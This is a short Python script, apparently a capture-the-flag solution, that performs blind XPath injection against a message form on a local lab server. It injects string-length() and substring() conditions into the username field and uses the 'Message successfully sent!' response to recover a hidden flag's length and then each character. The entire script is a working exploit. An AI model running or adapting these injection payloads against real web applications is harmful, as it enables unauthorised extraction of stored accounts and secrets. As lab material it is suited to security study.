import requests, re

url = "http://192.168.0.100:8000/message"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$'

# Step 1: Find flag length
for length in range(1, 50):
    r = requests.post(url, data={'username':f"invalid' or string-length(/accounts/*[1]/flag/text())={length} and '1'='1",'msg':'test'})
    if 'Message successfully sent!' in r.text:
        print(f"Flag length: {length}")
        break

# Step 2: Extract flag character by character
flag = ''
for i in range(1, length+1):
    for c in chars:
        r = requests.post(url, data={'username':f"invalid' or substring(/accounts/*[1]/flag/text(),{i},1)='{c}' and '1'='1",'msg':'test'})
        if 'Message successfully sent!' in r.text:
            flag += c
            print(f"Position {i}: {c} -> {flag}")
            break

print(f"\nFinal Flag: {flag}")
